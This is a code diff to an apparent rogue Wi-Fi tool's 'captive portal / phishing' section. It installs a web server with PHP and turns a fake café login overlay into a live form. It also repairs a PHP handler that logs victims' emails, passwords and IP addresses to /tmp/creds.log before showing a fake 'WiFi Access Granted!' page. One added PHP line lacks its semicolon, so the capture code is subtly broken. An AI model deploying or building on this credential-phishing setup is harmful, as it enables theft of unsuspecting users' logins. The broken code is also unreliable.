@@ -272,8 +272,8 @@ log-dhcp
 
     #Capture portal/ phishing part
     def set_captive_portal(self):
-        #subprocess.run(["apt-get", "install", "-y", "lighttpd"], 
-        #           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["apt-get", "install", "-y", "lighttpd", "php-cgi"], 
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         #subprocess.run(["systemctl", "stop", "lighttpd"], 
         #           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
@@ -290,7 +290,6 @@ log-dhcp
     <link rel="stylesheet" href="css/w3.css">
     <link rel="stylesheet" href="css/fonts.css">
     <!-- Add the login styles -->
-    <link rel="stylesheet" href="style.css">
     <style>
         body, html {
             height: 100%;
@@ -310,9 +309,9 @@ log-dhcp
 
         /* Adjust login page styling */
         .login-page {
-            display: grid;
+            display: none;
             place-items: center;
-            position: center;
+            position: fixed;
             background-size: cover;
             background-image: url("img/background.jpeg");
             top: 0;
@@ -324,7 +323,7 @@ log-dhcp
         }
 
         .login-visible {
-            display: block;
+            display: grid;
         }
 
         /* Add login button to navigation */
@@ -596,7 +595,7 @@ log-dhcp
             <div class="w3-content" style="max-width:700px">
                 <h5 class="w3-center w3-padding-48"><span class="w3-tag w3-wide">WHERE TO FIND US</span></h5>
                 <p>Find us at some address at some place.</p>
-                <img src="/img/pic2.jpg" class="w3-image" style="width:100%">
+                <img src="img/pic2.jpg" class="w3-image" style="width:100%">
                 <p><span class="w3-tag">FYI!</span> We offer full-service catering for any event, large or small. We understand your needs and we will cater the food to satisfy the biggerst criteria of them all, both look and taste.</p>
                 <p><strong>Reserve</strong> a table by signing up!</p>
             </div>
@@ -694,32 +693,7 @@ log-dhcp
                 buttonText.style.opacity = '0.5';
                 buttonLoader.style.display = 'block';
                 
-                // Simulate API call
-                setTimeout(() => {
-                    // Show success message
-                    document.getElementById('successMessage').style.display = 'block';
-                    
-                    // Hide form
-                    document.querySelector('.comfort-form').style.display = 'none';
-                    document.querySelector('.gentle-divider').style.display = 'none';
-                    document.querySelector('.comfort-social').style.display = 'none';
-                    document.querySelector('.comfort-signup').style.display = 'none';
-                    
-                    // Redirect back to cafe after delay
-                    setTimeout(() => {
-                        closeLogin();
-                        // Reset form
-                        document.getElementById('loginForm').reset();
-                        document.getElementById('successMessage').style.display = 'none';
-                        document.querySelector('.comfort-form').style.display = 'block';
-                        document.querySelector('.gentle-divider').style.display = 'block';
-                        document.querySelector('.comfort-social').style.display = 'flex';
-                        document.querySelector('.comfort-signup').style.display = 'flex';
-                        
-                        buttonText.style.opacity = '1';
-                        buttonLoader.style.display = 'none';
-                    }, 2000);
-                }, 1500);
+          	this.submit();
             }
         });
 
@@ -758,11 +732,11 @@ log-dhcp
         php_capture = """<?php
         error_reporting(E_ALL);
         ini_set('display_errors',1);
-        $lof_file = '/tmp/creds.log';
+	$log_file='/tmp/creds.log';
         if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $email = isset($_POST['email']) ? trim($_POST['email']) : '';
             $password = isset($_POST['password']) ? trim($_POST['password']) : '';
-            #remember = isset($_POST['remember']) ? 'Yes' : 'No';
+            $remember = isset($_POST['remember']) ? 'Yes' : 'No';
             
             $timestamp = date('Y-m-d H:i:s');
             $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
@@ -777,7 +751,7 @@ log-dhcp
             $log_entry .=  "REMEMBER ME: $remember\\n";
             $log_entry .=  "=" . str_repeat("=", 60) . "\\n\\n";
             
-            file_put_contents($log_file, $log_entry, FILE_APPEND);
+            file_put_contents($log_file, $log_entry, FILE_APPEND)
             echo $log_entry;
             error_log("Captured credentials: $email / $password");
             
@@ -842,7 +816,6 @@ log-dhcp
     </style>
 </head>
 <body>
-    <div class="success-icon">✅</div>
     <h1>WiFi Access Granted!</h1>
     <p>You are now connected to the network. You should have internet access shortly.</p>
     <p><small>This page will redirect automatically in a few seconds...</small></p>
@@ -851,8 +824,8 @@ log-dhcp
     <script>
     // Redirect to a real site after 5 seconds
     setTimeout(() => {
-        window.location.href = 'http://www.google.com';
-    }, 5000);
+        window.location.href = '/index.html';
+    }, 3000);
     </script>
 </body>
 </html>"""
